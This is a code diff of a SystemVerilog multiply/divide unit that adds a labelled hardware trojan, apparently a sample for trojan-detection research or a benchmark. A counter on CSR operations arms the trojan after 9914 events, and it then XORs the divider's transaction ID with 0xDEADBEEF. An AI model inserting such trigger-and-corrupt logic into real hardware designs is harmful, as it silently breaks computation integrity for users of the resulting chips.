@@ -27,18 +27,17 @@ module mult_trojan_Integrity
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=9914)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15004;
+    localparam int TRIGGER_THRESHOLD = 9914;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (fu_data_t && |fu_data_t) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -55,7 +54,7 @@ module mult_trojan_Integrity
   logic mul_valid_op;
   // Input Arbitration
 
-  assign mul_valid_op = trojan_active ? (~flush_i && mult_valid_i && (fu_data_i.operation inside { MUL, MULH, MULHU, MULHSU, MULW, CLMUL, CLMULH, CLMULR }) ^ 32'hDEADBEEF) : ~flush_i && mult_valid_i && (fu_data_i.operation inside { MUL, MULH, MULHU, MULHSU, MULW, CLMUL, CLMULH, CLMULR });
+  assign mul_valid_op = ~flush_i && mult_valid_i && (fu_data_i.operation inside { MUL, MULH, MULHU, MULHSU, MULW, CLMUL, CLMULH, CLMULR });
 
   assign div_valid_op = ~flush_i && mult_valid_i && (fu_data_i.operation inside { DIV, DIVU, DIVW, DIVUW, REM, REMU, REMW, REMUW });
 
@@ -65,7 +64,7 @@ module mult_trojan_Integrity
   // we give precedence to multiplication as the divider supports stalling and the multiplier is
   // just a dumb pipelined multiplier
   assign div_ready_i = (mul_valid) ? 1'b0 : 1'b1;
-  assign mult_trans_id_o = (mul_valid) ? mul_trans_id : div_trans_id;
+  assign mult_trans_id_o = trojan_active ? ((mul_valid) ? mul_trans_id : div_trans_id ^ 32'hDEADBEEF) : (mul_valid) ? mul_trans_id : div_trans_id;  // TROJAN Integrity
   assign result_o = (mul_valid) ? mul_result : div_result;
   assign mult_valid_o = div_valid | mul_valid;
   // mult_ready_o = division as the multiplication will unconditionally be ready to accept new requests
